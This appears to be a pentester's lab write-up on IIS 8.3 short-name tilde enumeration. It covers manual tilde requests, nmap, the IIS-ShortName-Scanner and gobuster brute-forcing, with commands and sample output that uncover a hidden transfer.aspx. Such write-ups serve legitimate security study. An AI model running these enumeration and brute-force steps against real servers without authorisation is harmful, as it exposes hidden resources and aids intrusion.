## IIS Tilde Enumeration (8.3 Short Name Disclosure)
#### 1. Overview

IIS Tilde Enumeration is used to discover hidden files or directories on IIS servers that use 8.3 short file name format (filename limited to 8 characters + `~n` + 3-character extension). This technique takes advantage of how Microsoft IIS handles legacy short names, enabling access to unintended or protected resources.
#### 2. How 8.3 Naming Works

- Windows automatically generates short names (8.3 format) for files/directories.    
- Format: `FILENAME~1.EXT`
- Useful for backwards compatibility but introduces an information disclosure vulnerability.

Example short names:

- `SecretDocuments` → `SECRE~1`    
- `somefile.txt` → `SOMEFI~1.TXT`
- `somefile1.txt` → `SOMEFI~2.TXT`
#### 3. Manual Tilde Enumeration

Step-by-step:

1. Request single character guesses:    

```
http://example.com/~a
http://example.com/~b
...
```

2. Based on HTTP response (`200 OK`), continue refining:

```
http://example.com/~se
http://example.com/~sec
...
```

Eventually:

```
http://example.com/secret~1/somefi~1.txt
```

These can reveal full paths and filenames even when not directly linked on the site.
#### 4. Environment Recon with Nmap

```bash
nmap -p- -sV -sC --open 10.129.224.91
```

Sample Output:

```
80/tcp open  http Microsoft IIS httpd 7.5
```

IIS 7.5 is vulnerable to short name enumeration attacks.
#### 5. Tool: IIS-ShortName-Scanner

Source: GitHub → `iis-shortname-scanner.jar`

Requirements:

- Oracle Java    
- No proxy needed (press Enter when prompted)

Usage:

```bash
java -jar iis_shortname_scanner.jar 0 5 http://<TARGET>/
```

Sample Output:

```
Vulnerable!
Identified directories:
  - ASPNET~1
  - UPLOAD~1
Identified files:
  - CSASPX~1.CS
  - TRANSF~1.ASP
```

Targeting `TRANSF~1.ASP` for filename brute-forcing (direct access blocked).
#### 6. Custom Wordlist for Gobuster

Use `egrep + sed` to generate targeted wordlist:

```bash
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

Explanation:

- `egrep -r ^transf`: Recursively look for words starting with "transf"    
- `sed 's/^[^:]*://'`: Remove filename prefixes from wordlist entries
- Output saved to `/tmp/list.txt`
#### 7. Brute-Force the Full Filename with Gobuster

```bash
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```

Options:

- `-x .aspx,.asp`: Appends these extensions to each word    
- `-w /tmp/list.txt`: Custom wordlist from previous step

Sample Output:

```
/transfer.aspx        (Status: 200) [Size: 941]
```

Filename transfer.aspx is discovered corresponding to TRANSF~1.ASP
### Summary

| Technique             | Purpose                                       |
| --------------------- | --------------------------------------------- |
| Manual Tilde Requests | Fingerprint short file/dir names              |
| Nmap                  | Detect vulnerable IIS version (7.5 and below) |
| IIS-ShortName-Scanner | Automate discovery of 8.3 short names         |
| Gobuster + Wordlist   | Brute-force full filenames from short names   |

IIS Tilde Enumeration is still relevant in legacy environments where 8.3 naming is enabled and IIS hasn’t been hardened. Always follow up with brute-force attacks after identifying short names to fully recover actual paths and gain access.
# Tags
> #Exploitation #Application-Enum #IIS-Tilde #Windows